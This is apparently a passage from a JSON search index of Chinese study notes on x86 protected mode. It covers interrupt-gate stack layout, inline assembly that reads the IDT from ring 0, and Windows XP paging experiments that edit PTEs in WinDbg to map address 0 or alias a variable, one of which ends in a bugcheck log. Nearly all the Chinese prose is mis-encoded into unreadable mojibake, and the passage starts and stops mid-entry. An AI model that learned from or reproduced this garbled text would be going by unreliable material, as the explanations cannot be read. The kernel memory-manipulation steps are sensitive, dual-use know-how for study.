------------| EIP | &lt;----ESP | EIP | | EIP | ------------ ------------ ------------| CS | &lt;----ESP+0x4 | CS | | CS | ------------ ------------ ------------| EFLAGS | &lt;----ESP+0x8 | EFLAGS | &lt;----ESP | EFLAGS | &lt;----ESP-0x4 ------------ ------------ ------------| ESP | | ESP | &lt;----ESP+0x4 | ESP | &lt;----ESP ------------ ------------ ------------| SS | | SS | | SS | &lt;----ESP+0x4 ------------ ------------ ------------| | | | | | ------------ ------------ ------------æ ¸å¿ƒä»£ç ï¼š1234567891011121314151617181920212223__asm&#123; //int 3 //è®©æ–­ç‚¹åœåœ¨windbgï¼Œè®©æˆ‘ä»¬åˆ†æä¸‹å¯„å­˜å™¨å’Œå †æ ˆ mov eax,0x8003f400 //è¯»å–é«˜2Gçš„åœ°å€ï¼Œåœ°å€æ˜¯IDTè¡¨åŸºå€ mov ebx,[eax] mov dword ptr ds:[IDTItem],ebx //IDTè¡¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„ä½32ä½ï¼ˆå°ç«¯åºï¼‰ mov ecx,[eax+0x4] mov dword ptr ds:[IDTItem+0x4],ecx //IDTè¡¨ç¬¬ä¸€ä¸ªå…ƒç´ çš„é«˜32ä½ï¼ˆå°ç«¯åºï¼‰ //å¤„ç†å †æ ˆéƒ¨åˆ† add esp,0x4*2 popfd //popfdåESPæŒ‡å‘esp3 mov eax,[esp] //ç§»åŠ¨esp3åˆ°eflagesçš„ä½ç½® mov [esp-0x4],eax mov eax,[esp+0x4] //ç§»åŠ¨SSåˆ°ESPçš„ä½ç½® mov [esp],eax sub esp,0x4*3 //æ¢å¤ESPæŒ‡é’ˆ retf&#125;å†…è”æ±‡ç¼–é‡ŒåŠ ä¸Šint 3ï¼Œå•æ­¥æ­¥å…¥è¿›windbgåæ‰æ­£å¸¸ï¼Œä¸åŠ çš„è¯ä¼šåƒè¿™æ ·ï¼šï¼ˆæˆ‘ä¹Ÿä¸çŸ¥é“åŸå› ï¼‰æ‰§è¡Œä¸­æ–­å‰åˆšè¿›0ç¯æ‰§è¡Œretfå‰æ‰§è¡Œ1add esp,8åå †æ ˆå†…å®¹åˆå˜äº†ï¼ˆéé¢„æœŸï¼‰æ‰€ä»¥æ‰§è¡Œretfå‰å˜æˆè¿™æ ·äº†ï¼Œç„¶åretfä¼šå‡ºé”™ã€‚eipè¢«èµ‹äº†08 00 00 00ä¸­æ–­é‡ŒåŠ äº†åˆä¸€ä¸ªä¸­æ–­int 3ï¼Œå°±ç®—ä¸€ç›´å•æ­¥æ‰§è¡Œï¼Œä¹Ÿå›ä¸åˆ°VCçš„"},{"title":"PDEã€PTEåˆæ­¥æ„Ÿå—","path":"/wiki/Protected_Mode/PDEã€PTEåˆæ­¥æ„Ÿå—.html","content":"æ¦‚å¿µ ç¬¬ä¸€çº§ï¼šé¡µç›®å½•è¡¨ï¼ˆPDTï¼ŒPage-Directory Tableï¼‰ é¡µç›®å½•è¡¨é¡¹ï¼ˆPDEï¼ŒPage Directory Entryï¼‰ï¼Œé¡µç›®å½•è¡¨ä¸­çš„æˆå‘˜ ç¬¬äºŒçº§ï¼šé¡µè¡¨ï¼ˆPTTï¼ŒPage Tableï¼‰ é¡µè¡¨é¡¹ï¼ˆPTEï¼ŒPage Table Entryï¼‰ï¼Œé¡µè¡¨ä¸­çš„æˆå‘˜ CR3é‡Œå­˜å‚¨çš„ç‰©ç†åœ°å€æŒ‡å‘é¡µç›®å½•è¡¨ï¼ˆPDTï¼‰ï¼Œé‡Œé¢çš„æˆå‘˜é¡µç›®å½•è¡¨é¡¹ï¼ˆPDEï¼‰æŒ‡å‘é¡µè¡¨ï¼ˆPTTï¼‰ï¼Œé‡Œé¢çš„æˆå‘˜é¡µè¡¨é¡¹ï¼ˆPTEï¼‰æŒ‡å‘ç‰©ç†é¡µã€‚ PDEå’ŒPTEåä¸‰ä½ï¼ˆåå…­è¿›åˆ¶ï¼‰æ˜¯å±æ€§ é¡µè¡¨é¡¹ï¼ˆPTEï¼‰ç‰¹å¾ PTEå¯ä»¥ä¸æŒ‡å‘ç‰©ç†é¡µ è¿˜æ²¡åˆ†é…åˆ° 1ä¸ªPTEåªèƒ½æŒ‡å‘1ä¸ªç‰©ç†é¡µ å¤šä¸ªPTEå¯ä»¥æŒ‡å‘åŒä¸€ä¸ªç‰©ç†é¡µï¼ˆä¸åŒæƒé™ï¼‰ 10-10-12åˆ†é¡µä½æ•°åˆ’åˆ†åˆ†æ åœ¨Windowsä¸­ï¼Œä¸€ä¸ªé¡µçš„å¤§å°é€šå¸¸ä¸º4KB(ä¹Ÿæœ‰4MBçš„é¡µï¼Œç§°ä¸ºå¤§é¡µï¼Œè¿™é‡Œå…ˆä¸ç®¡)ã€‚ ç‰©ç†é¡µå¤§å°4KBï¼Œå³2^12æ¬¡æ–¹ï¼Œè¦ç”¨12ä½è¡¨ç¤ºã€‚ é¡µç›®å½•è¡¨ï¼ˆPDTï¼‰å¤§å°4KBï¼Œ4096å­—èŠ‚ï¼Œæ¯ä¸€é¡¹æ˜¯4å­—èŠ‚ï¼ˆ32ä½ä¸‹åœ°å€å®½åº¦4å­—èŠ‚ï¼‰ï¼Œæ‰€ä»¥æœ‰1024é¡¹ï¼Œå³2^10æ¬¡æ–¹ï¼Œéœ€è¦10ä½æ¥ä½œä¸ºé¡µç›®å½•è¡¨ï¼ˆPDTï¼‰çš„åºå·ï¼Œè¡¨æ˜æ‰¾å“ªä¸€é¡¹ã€‚ é¡µè¡¨ï¼ˆPTTï¼‰å¤§å°4KBï¼Œæ¯ä¸€é¡¹æ˜¯4å­—èŠ‚ï¼ˆ32ä½ä¸‹åœ°å€å®½åº¦4å­—èŠ‚ï¼‰ï¼Œæ‰€ä»¥æœ‰1024é¡¹ï¼Œå³2^10æ¬¡æ–¹ï¼Œéœ€è¦10ä½æ¥ä½œä¸ºé¡µè¡¨ï¼ˆPTTï¼‰çš„åºå·ï¼Œè¡¨æ˜æ‰¾å“ªä¸€é¡¹ã€‚ æ‰€ä»¥æ˜¯10-10-12ã€‚ å®éªŒ 1. æ‹†åˆ†çº¿æ€§åœ°å€0ï¼Œè§‚å¯ŸPTEæ˜¯å¦æœ‰ç‰©ç†é¡µ çº¿æ€§åœ°å€0+windbgç”¨! process 0 0éšä¾¿æ‰¾1ä¸ªè¿›ç¨‹çš„CR3ï¼Œå»æ‰¾ç‰©ç†é¡µ çº¿æ€§åœ°å€0æŒ‰10-10-12æ‹†ï¼Œéƒ½æ˜¯0ï¼Œå’Œæ²¡åŠ ä¸€æ ·ï¼Œæ‰€ä»¥ä¸‹é¢æŠŠPDEå’ŒPTEå3ä½å±æ€§ä½å†™æˆ0ï¼Œç„¶åæŸ¥å°±è¡Œã€‚ å¯ä»¥çœ‹åˆ°ï¼Œçº¿æ€§åœ°å€0æ‹†å‡ºæ¥çš„PTEä¸º0ï¼Œå³æ²¡æœ‰æŒ‡å‘ç‰©ç†é¡µã€‚ï¼ˆè¯æ˜äº†ä¸Šé¢è¯´çš„PTEå¯ä»¥ä¸æŒ‡å‘ä»»ä½•ç‰©ç†é¡µï¼‰ æ‰€ä»¥0åœ°å€æ— æ³•è¯»æ•°æ®ï¼Œä¹Ÿæ²¡åŠæ³•å†™æ•°æ®ï¼Œå› ä¸ºæ²¡åˆ†é…ç‰©ç†é¡µã€‚é‚£æˆ‘ä»¬å®åœ¨æƒ³å†™å‘¢ï¼Ÿç»™å®ƒæŒ‚ä¸€ä¸ªç‰©ç†é¡µå‘—ï¼Œæ¥ï¼Œç¬¬äºŒé¢˜ã€‚ 2. å‘0åœ°å€è¯»å†™æ•°æ® ä»£ç åˆ†æï¼šå˜é‡xä¸€è¿è¡Œå°±ä¼šè‡ªåŠ¨åˆ†é…åˆ°ç‰©ç†åœ°å€ï¼Œå°†çº¿æ€§åœ°å€0çš„PTEæ”¹æˆå˜é‡xçš„PTEï¼Œå³åœ°å€0æŒ‚ä¸Šäº†ç‰©ç†é¡µï¼Œå°±èƒ½è¯»å†™0åœ°å€äº†ã€‚ 12345678910111213141516171819#include &lt;stdio.h&gt;int main(int argc, char* argv[])&#123;\tint x = 1;\tprintf(&quot;xçš„åœ°å€:%x &quot;,&amp;x); //åœ¨windbgæŒ‚èµ·ï¼Œå¾—åˆ°ç¨‹åºçš„CR3ï¼Œæ ¹æ®CR3å’Œå˜é‡xçš„åœ°å€å¾—åˆ°PTE //æŠŠçº¿æ€§åœ°å€0çš„PTEæ”¹æˆå˜é‡xçš„PTE getchar(); //ä¿®æ”¹PTEå0åœ°å€å¤„çš„å€¼æ˜¯å¤šå°‘ï¼Œåæ–‡è®²æ‹“å±•ä¼šæåˆ°è¿™å¥\tprintf(&quot;å‘0åœ°å€å†™å…¥123å‰ï¼Œ0åœ°å€æ•°æ®ä¸º:%d &quot;,*(int*)0); //å‘0åœ°å€å†™å…¥æ•°æ®\t*(int*)0 = 123; //å‘0åœ°å€è¯»æ•°æ®\tprintf(&quot;å‘0åœ°å€å†™å…¥123åï¼Œ0åœ°å€æ•°æ®ä¸º:%d &quot;,*(int*)0);\treturn 0;&#125; ç¼–è¯‘è¿è¡Œï¼Œä¸€è¿è¡Œå˜é‡xä¼šè‡ªåŠ¨åˆ†é…åˆ°çº¿æ€§åœ°å€ã€‚ 1234çº¿æ€§åœ°å€12ff7Cæ‹†åˆ†0 //10 ;0*4=00100101111,12F //10 ;12F*4=4BCF7C //12 windbgä¸‹æ–­ï¼Œ! process 0 0æŸ¥çœ‹åˆ°è¯¥è¿›ç¨‹çš„CR3æ˜¯19e8a000 å› ä¸ºåœ¨åŒä¸€ä¸ªè¿›ç¨‹ä¸­ï¼Œæ‰€ä»¥å˜é‡xå’Œåœ°å€0çš„CR3ä¸€æ · 1234çº¿æ€§åœ°å€0æ‹†åˆ†0 //10 ;0*4=00 //10 ;0*4=00 //12 æŠŠçº¿æ€§åœ°å€0çš„PTEæ”¹æˆå˜é‡xçš„PTE è¾“å…¥gï¼Œè¿”å›è™šæ‹Ÿæœºï¼ŒæŸ¥çœ‹ç»“æœè¾“å‡ºï¼š ä¿®æ”¹PTEåï¼ŒæˆåŠŸè¯»ã€å†™0åœ°å€æ•°æ® è®²äº›ç»†èŠ‚ï¼Œä¸Šè¾¹å¯èƒ½æ²¡æ³¨æ„åˆ° å‚è€ƒï¼š ï¼ˆ18ï¼‰ä¿®æ”¹ PTE å®ç°æŒ‚ç‰©ç†é¡µè¯»å†™ç©ºæŒ‡é’ˆ-hambagaçš„csdnåšå®¢ PDEå’ŒPTE å˜é‡xçš„çº¿æ€§åœ°å€æ˜¯ï¼š12ff7cï¼ŒæŒ‰10-10-12æ‹†å®Œåæ˜¯ 1234çº¿æ€§åœ°å€12ff7Cæ‹†åˆ†0 //10 ;0*4=00100101111,12F //10 ;12F*4=4BCF7C //12 çº¿æ€§åœ°å€0æ‹†å®Œåæ˜¯ 1234çº¿æ€§åœ°å€0æ‹†åˆ†0 //10 ;0*4=00 //10 ;0*4=00 //12 ç¬¬ä¸€ä¸ª10éƒ½æ˜¯0ï¼ŒåŠ ä¸ŠCR3ä¸€æ ·ï¼Œæ‰€ä»¥PDEä¸€æ ·ã€‚ ç„¶åé€šè¿‡PDEå»é¡µè¡¨ï¼ˆPTTï¼‰æ‰¾PTEæ—¶ï¼Œå˜é‡xæ˜¯åŠ 4BCï¼Œåœ°å€0æ˜¯åŠ 0ï¼Œæ‰€ä»¥ä¸¤è€…æŒ‡å‘è£…ç€PTEçš„é¡µè¡¨ï¼ˆPTTï¼‰åœ°å€ä¸ä¸€æ ·ã€‚ å˜é‡x åœ°å€0 19dc1000+4BC=19ec5067 19dc1000+0=19dc1000 å°†åœ°å€0çš„PTEæ”¹æˆå˜é‡xçš„PTEåï¼Œåœ°å€0å’Œå˜é‡xçš„PTEéƒ½æŒ‡å‘äº†åŒä¸€ä¸ªç‰©ç†é¡µï¼Œä½†æ˜¯åç§»ä¸åŒï¼ˆæ‹†å®Œçš„12ä½ä¸ä¸€æ ·ï¼Œå˜é‡xçš„æ˜¯F7Cï¼Œåœ°å€0çš„æ˜¯0ï¼‰ã€‚ å¹¶ä¸æ˜¯åœ°å€0å°±ç”¨äº†å˜é‡xçš„å®é™…ç‰©ç†åœ°å€ï¼Œé€šè¿‡ä»£ç ä¸­ 12 //ä¿®æ”¹PTEå0åœ°å€å¤„çš„å€¼æ˜¯å¤šå°‘ï¼Œåæ–‡è®²æ‹“å±•ä¼šæåˆ°è¿™å¥printf(&quot;å‘0åœ°å€å†™å…¥123å‰ï¼Œ0åœ°å€æ•°æ®ä¸º:%d &quot;,*(int*)0); è¿™è¡Œè¾“å‡ºæ˜¯å¯ä»¥çœ‹å‡ºæ¥çš„ï¼Œä¿®æ”¹åœ°å€0çš„PTEåï¼Œè¾“å‡ºçš„å€¼æ˜¯70ï¼ˆéšæœºå€¼ï¼‰ï¼Œè€Œä¸æ˜¯å˜é‡xçš„å€¼1ã€‚ å˜é‡x åœ°å€0 ä¿®æ”¹PTEåçš„åœ°å€0 å¤‡æ³¨ çº¿æ€§åœ°å€ 12ff7c 0 0 CR3 19e8a000 19e8a000 19e8a000 å› ä¸ºåœ¨åŒä¸€ä¸ªè¿›ç¨‹ æ‹†åˆ†åç¬¬1ä¸ª10 0 0 0 CR3+ç¬¬1ä¸ª10ï¼ŒæŒ‡å‘çš„PDE 19dc1067 19dc1067 19dc1067 å› ä¸ºæ‹†åˆ†åçš„10ä¸€æ ·ï¼Œæ‰€ä»¥PDEä¸€æ · æ‹†åˆ†åç¬¬2ä¸ª10ï¼ˆå·²*4ï¼‰ 4BC 0 0 PDE+ç¬¬2ä¸ª10ï¼ŒæŒ‡å‘çš„PTE 19ec5067 0 19ec5067 å°†åœ°å€0çš„PTEæ”¹ä¸ºå’Œå˜é‡xçš„PTEä¸€æ · æ‹†åˆ†åçš„12 F7C 0 0 æŒ‡å‘çš„ç‰©ç†é¡µåŸºå€ 19ec5000 æ—  19ec5000 å®é™…ç‰©ç†åœ°å€ 19ec5000+F7C æ—  19ec5000+0 ç°åœ¨ï¼Œåœ°å€0çš„PTEå·²ç»æŒ‡å‘äº†ä¸€ä¸ªç‰©ç†é¡µï¼Œå¯ä»¥è¿›è¡Œè¯»å†™äº†ã€‚ æ‹“å±•å’Œæ€»ç»“ æœ‰æ•ˆçš„PTE=æœ‰æ•ˆçš„ç‰©ç†åœ°å€+P=1 æ²¡æœ‰æ‰€è°“ä¸èƒ½è®¿é—®çš„åœ°å€ï¼Œæ— è®º3ç¯è¿˜æ˜¯0ç¯ï¼Œåªè¦ç»™ä¸ªæœ‰æ•ˆçš„PTEå°±èƒ½è®¿é—® æ¨å¯¼è¿‡ç¨‹ï¼š æœ‰æ•ˆçš„ç‰©ç†åœ°å€0çš„PTEæ˜¯0ï¼Œåªæ”¹å±æ€§ä½èƒ½å®ç°å¯è¯»å¯å†™å—ï¼Ÿå³ä½¿æŠŠçº¿æ€§åœ°å€0çš„PTEï¼Œæ”¹äº†å±æ€§P=1ï¼ŒR/W=1ï¼Œæœ‰æ•ˆï¼Œå¯è¯»å¯å†™ã€‚ä¹Ÿä¸è¡ŒåŸå› ï¼šçº¿æ€§åœ°å€0çš„PTEç”±ç‰©ç†åœ°å€+12ä½çš„å±æ€§ç»„æˆã€‚å‡è®¾çº¿æ€§åœ°å€0çš„PTEï¼š0+12å±æ€§ï¼ˆçº¿æ€§åœ°å€0 å¯¹åº”-&gt;ç‰©ç†åœ°å€0ï¼‰0 PTE:0 + 12å±æ€§ï¼ˆçº¿æ€§åœ°å€0-&gt;ç‰©ç†åœ°å€0ï¼‰0 PTE:1234 + 12å±æ€§ï¼ˆçº¿æ€§åœ°å€1234-&gt;ç‰©ç†åœ°å€1234ï¼‰è¿™ä¸ªåœ°å€ä¸æ˜¯ä½ éšä¾¿æƒ³ç”¨å°±ç”¨çš„ï¼Œè¦çœ‹æ“ä½œç³»ç»Ÿæ˜¯å¦åˆ†é…äº†çš„ã€‚å›åˆ°ä¹‹å‰è¯´çš„ï¼ŒCPUå’Œæ“ä½œç³»ç»Ÿï¼Œé¡µçš„å…³ç³»ï¼ŒCPUå®šä¹‰äº†ä»CR3-&gt;ä¸€çº§é¡µ-&gt;äºŒçº§é¡µçš„æŸ¥æ‰¾è§„åˆ™ï¼Œä½†æ˜¯é¡µè¡¨çš„å†…å®¹ç”±æ“ä½œç³»ç»Ÿå®šä¹‰çš„ã€‚ä½ ä¸çŸ¥é“æ“ä½œç³»ç»Ÿåˆ†äº†å“ªäº›åœ°å€æ˜¯åˆ†äº†å“ªäº›æ²¡åˆ†ï¼Œæ‰€ä»¥è‡ªå·±å®šä¹‰ä¸€ä¸ªå˜é‡ï¼ˆè¿™ä¸ªå˜é‡ä¼šè‡ªåŠ¨åˆ†é…åˆ°ç‰©ç†é¡µï¼‰ï¼Œç„¶åå°†xçš„ç‰©ç†é¡µç»™0æŒ‚ä¸Šã€‚æ³¨æ„è¦ç»™å˜é‡xèµ‹å€¼ï¼Œxåªæœ‰å®šä¹‰å¯èƒ½æ²¡åˆ†é…åˆ°ç‰©ç†é¡µ1int x =1;1int x;Pä½=1å‡è®¾æˆ‘å®šä¹‰äº†ä¸€ä¸ªå˜é‡x1int x=12345678;é€šè¿‡10-10-12æ‹†åˆ†xçš„çº¿æ€§åœ°å€å¯ä»¥å¾—åˆ°xçš„PDEå’ŒPTEï¼Œè®°ä¸ºPTEAé€šè¿‡10-10-12æ‹†åˆ†çº¿æ€§åœ°å€0å¯ä»¥å¾—åˆ°0çš„PDEå’ŒPTEï¼Œè®°ä¸ºPTEBç„¶åå°†0çš„PTEä¿®æ”¹ä¸ºxçš„PTEï¼Œå¹¶ä¸”æŠŠ0çš„PTEçš„Pä½ä¿®æ”¹ä¸º0ã€‚ç°åœ¨ï¼Œxçš„PTEAï¼Œ0çš„PTEBï¼Œé™¤äº†Pä½ï¼Œå…¶ä»–ä¸€æ ·ï¼Œå› ä¸ºåœ°å€éƒ¨åˆ†20ä½ä¸€è‡´ï¼Œæ‰€ä»¥å®ƒä»¬æŒ‡å‘åŒä¸€ä¸ªç‰©ç†é¡µã€‚çœ‹0çš„PTEBï¼Œå®ƒçš„åœ°å€éƒ¨åˆ†20ä½ï¼ŒæŒ‡å‘äº†æœ‰æ•ˆçš„ç‰©ç†é¡µï¼Œä½†æ˜¯åœ¨ç¨‹åºä¸­è¿˜æ˜¯ä¸èƒ½è¯»å†™çº¿æ€§åœ°å€0ï¼Œå› ä¸ºPä½æ˜¯0ã€‚ ä¸ºä»€ä¹ˆä¿æŠ¤æ¨¡å¼è¿™ä¹ˆè®¾è®¡ï¼Ÿ å®ç°å¯¹å†…å­˜çš„ä¿æŠ¤ï¼Œå¯ä»¥é€šè¿‡Pä½ã€R/Wã€U/Sä½æ¥ä¿æŠ¤ï¼Œæƒ³æ€ä¹ˆä¿æŠ¤å°±æ€ä¹ˆä¿æŠ¤ è¯¾åç»ƒä¹  çº¿æ€§åœ°å€0ä¸ºä»€ä¹ˆä¸èƒ½è®¿é—®?å°†0åœ°å€è®¾ç½®ä¸ºå¯è¯»å¯å†™ã€‚ ç­”æ¡ˆåŒå®éªŒéƒ¨åˆ† ä¸ºå˜é‡xå†æ˜ å°„ä¸€ä¸ªçº¿æ€§åœ°å€,å¹¶é€šè¿‡è¿™ä¸ªæ–°çš„åœ°å€è¯»å–xçš„å€¼ã€‚ ç­”æ¡ˆåˆ†æä»£ç è¿è¡Œå‚è€ƒï¼šï¼ˆ18ï¼‰ä¿®æ”¹ PTE å®ç°æŒ‚ç‰©ç†é¡µè¯»å†™ç©ºæŒ‡é’ˆ-hambaga-csdnåšå®¢å›é¡¾ä¸€ä¸‹å¯»å€è¿‡ç¨‹ï¼šçº¿æ€§åœ°å€ï¼š10:10:12CR3+ç¬¬1ä¸ª10ä½*4-&gt;PDEPDE(åä¸‰ä½æ¸…0)+ç¬¬2ä¸ª10ä½*4-&gt;PTEPTE(åä¸‰ä½æ¸…0)+12ä½ï¼ˆåç§»ï¼‰-&gt;ç‰©ç†é¡µå£°æ˜ä¸€ä¸ªintç±»å‹å˜é‡xï¼Œèµ‹å€¼ä¸º1ã€‚ç”¨VirualAllocç”³è¯·ä¸€å—ç‰©ç†é¡µï¼Œå¾—åˆ°æŒ‡é’ˆpã€‚åŒä¸€ä¸ªç¨‹åºï¼ŒCR3ä¸€æ ·ã€‚å› ä¸ºæŒ‡é’ˆpè¦æŒ‡å‘å˜é‡xï¼Œæ‰€ä»¥ç‰©ç†é¡µé¡µåç§»è¦ä¸€æ ·ï¼Œ12ä½ä¸€æ ·ã€‚ç¬¬1ä¸ª10ä½å†³å®šPDEï¼Œç¬¬2ä¸ª10ä½å†³å®šPTEã€‚å°†æŒ‡é’ˆpçš„PTEä¿®æ”¹å’Œå˜é‡xçš„ä¸€æ ·å°±å¥½äº†ã€‚æ€»ç»“ï¼šæ”¹æŒ‡é’ˆpçš„PTEå’Œ12ä½ã€‚ç‰©ç†é¡µé¡µåç§»åœ¨ä»£ç ä¸­æ”¹ï¼ŒæŒ‡é’ˆpçš„PTEåœ¨windbgä¸­æ”¹ã€‚å¦‚æœå°†æŒ‡é’ˆpçš„ç¬¬1ä¸ª10ä½ä¹Ÿæ”¹äº†ï¼Œå…¶å®æ•´ä¸ªçº¿æ€§åœ°å€å’Œå˜é‡xæ˜¯ä¸€æ ·çš„äº†ã€‚ä»£ç è¡¨ç¤ºå°±æ˜¯12int x = 1;int *p = &amp;x;//pæŒ‡å‘xçš„åœ°å€12345678910111213141516171819202122232425262728293031#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; int x = 1; // ç”³è¯·ä¸€ä¸ªæ–°çš„ç‰©ç†é¡µï¼Œå°†pçš„PTEå’Œç‰©ç†é¡µå†…åç§»æ”¹æˆå’Œxä¸€æ · int p = (int)VirtualAlloc(NULL, 0x1000, MEM_COMMIT, PAGE_READWRITE); int p_bak = p; // å¤‡ä»½æ–°åˆ†é…çš„å†…å­˜åŒºåŸŸçš„èµ·å§‹åœ°å€ï¼Œä»¥ä¾¿åç»­é‡Šæ”¾å†…å­˜ memset((int *)p, 0, 0x1000); // å°†æ–°åˆ†é…çš„å†…å­˜åŒºåŸŸæ¸…é›¶ printf(&quot;xçš„åœ°å€ï¼š%x &quot;, &amp;x); //ä¿®æ”¹æŒ‡é’ˆpçš„PTEå’Œç‰©ç†é¡µåç§» printf(&quot;ä¿®æ”¹å‰ï¼ŒæŒ‡é’ˆpçš„çº¿æ€§åœ°å€ï¼š%x &quot;, p); p &amp;= 0xFFFFF000; p |= ((int)&amp;x &amp; 0x00000FFF); //å°†æŒ‡é’ˆpçš„å12ä½ä¿®æ”¹ä¸ºå˜é‡xçš„ printf(&quot;ä¿®æ”¹åï¼ŒæŒ‡é’ˆpçš„çº¿æ€§åœ°å€ï¼š%x &quot;, p); getchar(); // åœ¨windbgé‡Œä¿®æ”¹ p çš„ PTE // ç”¨æ–°çš„çº¿æ€§åœ°å€è¯»x printf(&quot;é€šè¿‡çº¿æ€§åœ°å€pæ¥è¯»å–xçš„å€¼ï¼Œ*addrï¼š%x &quot;, *(int *)p); // 0x1 // ç”¨æ–°çš„çº¿æ€§åœ°å€å†™x *(int *)p = 0x112233; printf(&quot;é€šè¿‡çº¿æ€§åœ°å€pä¿®æ”¹xåï¼Œxï¼š%x &quot;, x); // 0x112233 getchar(); VirtualFree((int *)p_bak, 0x1000, MEM_DECOMMIT); return 0;&#125;è¿è¡Œwindbgä¸‹æ–­ï¼ŒæŸ¥å˜é‡xçš„PTEæŸ¥åˆ°è¯¥è¿›ç¨‹çš„CR3æ˜¯20a520001234çº¿æ€§åœ°å€12ff7Cæ‹†åˆ†0 //10 ;0*4=00100101111,12F //10 ;12F*4=4BCF7C //12æŸ¥xçš„PTEï¼š123!dd 20a52000+0!dd 2061d000+4BC!dd 20321000+F7CPTEæ˜¯20321067ä¿®æ”¹æŒ‡é’ˆpçš„PTEä¸ºå˜é‡xçš„1234çº¿æ€§åœ°å€3a0f7cæ‹†åˆ†0 //10 ;0*4=011 1010 0000ï¼Œ3A0 //10 ;3A0*4=E80F7C //12æ”¹æŒ‡é’ˆpçš„å‘½ä»¤123!dd 2061d000+E80!ed 2061de80 20321067!dd 2061d000+E80è¿”å›è™šæ‹Ÿæœºç»§ç»­æ‰§è¡Œå›è½¦ï¼ŒgetcharæŒ‰ä¸‹åï¼Œwindbgå°±æŠ¥é”™äº†ã€‚æˆ‘ä¹Ÿä¸çŸ¥é“ä»€ä¹ˆåŸå› 123456789101112131415kd&gt; g*** Fatal System Error: 0x0000004e (0x00000099,0x00000000,0x00000000,0x00000000)Break instruction exception - code 80000003 (first chance)A fatal system error has occurred.Debugger entered on first try; Bugcheck callbacks have not been invoked.A fatal system error has occurred.Connected to Windows XP 2600 x86 compatible target at (Thu Aug 17 15:03:09.317 2023 (UTC + 8:00)), ptr64 FALSELoading Kernel Symbols........................................... 10-10-12åˆ†é¡µæ¨¡å¼ç‰©ç†å†…å­˜èƒ½å¤Ÿè¯†åˆ«çš„æœ€å¤šèŒƒå›´æ˜¯å¤šå°‘? ç­”æ¡ˆ1ä¸ªPDEæŒ‡å‘äº†1ä¸ªé¡µè¡¨ã€‚æœ‰å¤šå°‘ä¸ªPDEå°±æœ‰å¤šå°‘ä¸ªé¡µè¡¨ã€‚é¡µç›®å½•è¡¨æœ‰1024é¡¹ï¼Œé¡µè¡¨æœ‰1024é¡¹ï¼Œç‰©ç†é¡µæœ‰4KBå¯»å€èŒƒå›´: 1024Ã—1024Ã—4096 = 4GBç‰©ç†é¡µå¤§å°ä¸º4KBï¼ˆåœ¨10-10-12ä¸­è¿˜æœ‰ä¸€ç§é¡µ,4MB,ç§°ä¸ºå¤§é¡µ)ä¸€å¼ é¡µè¡¨èƒ½åŒ…å«çš„ç‰©ç†é¡µ:1024Ã—4KB = 4MB10-10-12åˆ†é¡µä¸­å…±æœ‰1024å¼ é¡µè¡¨:1024Ã—4MB= 4GB å¦‚ä½•åˆ¤æ–­2ä¸ªçº¿æ€§åœ°å€æ˜¯å¦åœ¨åŒä¸€ä¸ªç‰©ç†é¡µ? ç­”æ¡ˆé€šè¿‡ç»ƒä¹ 1ã€2é¢˜å¯ä»¥æ„Ÿå—åˆ°å‰æï¼šCR3ä¸€æ ·ã€‚çœ‹çº¿æ€§åœ°å€å‰20ä½ï¼Œåªè¦ç›¸åŒå°±åœ¨åŒä¸€ä¸ªç‰©ç†é¡µã€‚å› ä¸ºå‰20ä½ç¡®å®šäº†PDEå’ŒPTEï¼ŒPTEç›¸åŒä¸€å®šæ˜¯åŒä¸€ä¸ªç‰©ç†é¡µã€‚æ¨å¯¼ï¼šPTEç›¸åŒï¼Œç‰©ç†é¡µç›¸åŒã€‚PTEç›¸åŒï¼ŒPDEä¸€å®šä¸€æ ·ã€‚æ‰€ä»¥PDEã€PTEä¸€æ ·ã€‚ æ¨å¯¼ï¼šä¸€æ•´ä¸ªç‰©ç†é¡µçš„å±æ€§æ˜¯ä¸€è‡´çš„æœ‰å¦‚ä¸‹Cä»£ç 12int *p = 0;*p = 12345678;ç­‰ä»·æ±‡ç¼–æŒ‡ä»¤æ˜¯1mov dword ptr ds:[0],12345678cpuæ‰§è¡Œè¿™è¡ŒæŒ‡ä»¤æ—¶å¦‚ä½•åˆ¤æ–­è¿™ä¸ªåœ°å€å¯ä¸å¯å†™ï¼Ÿå…ˆç”¨æ®µçš„æœºåˆ¶æ£€æŸ¥ï¼Œdsçš„Attributeå¯è¯»ï¼Œokæ²¡é—®é¢˜ç®—çº¿æ€§åœ°å€,ds.base+0ï¼Œä¸º0ã€‚ç„¶åæ‹†ï¼Œ10-10-12ï¼Œè‚¯å®šèƒ½ç®—åˆ°ä¸€ä¸ªç‰©ç†é¡µï¼Œæ— è®ºçº¿æ€§åœ°å€ä¸ºå¤šå°‘ã€‚å¾—åˆ°ç‰©ç†é¡µå¿…é¡»ç»è¿‡PTEï¼ŒPTEä¸­çš„ä¸¤ä¸ªå±æ€§å†³å®šäº†è¿™ä¸ªç‰©ç†é¡µèƒ½ä¸èƒ½è¯»ï¼Œèƒ½ä¸èƒ½å†™ã€‚æ‹“å±•ï¼šé€šè¿‡æ‹†åˆ†çº¿æ€§åœ°å€0ï¼Œ10-10-12ï¼Œæ‰¾åˆ°äº†è¿™ä¸ªç‰©ç†é¡µï¼Œå¾—çŸ¥è¿™ä¸ªç‰©ç†é¡µä¸èƒ½è¯»ä¹Ÿä¸èƒ½å†™ï¼Œé‚£ä¹ˆè¿™æ•´ä¸€ä¸ªç‰©ç†é¡µéƒ½ä¸èƒ½è¯»ä¸èƒ½å†™ã€‚ä¸€ä¸ªç‰©ç†é¡µçš„å±æ€§æ˜¯ä¸€æ ·çš„ã€‚ä¸ä¼šå‡ºç°åœ¨åŒä¸€ä¸ªç‰©ç†é¡µä¸­ï¼Œä¸Šé¢å¯è¯»ä¸å¯å†™ï¼Œä¸‹é¢å¯è¯»å¯å†™ã€‚å·²çŸ¥çº¿æ€§åœ°å€0å¯¹åº”çš„ç‰©ä¸šé¡µå¯è¯»ä¸å¯å†™ï¼Œé‚£ä¹ˆå°±çŸ¥é“å¯¹åº”çš„çº¿æ€§åœ°å€0~ffféƒ½å¯è¯»ä¸å¯å†™ã€‚ï¼ˆå‰20ä½ä¸€æ ·ï¼Œåœ¨åŒä¸€ä¸ªç‰©ç†é¡µä¸Šï¼‰ã€‚"},{"title":"ä»»åŠ¡é—¨","path":"/wiki/Protected_Mode/ä»»åŠ¡é—¨.html","content":"è¦ç‚¹å›é¡¾ 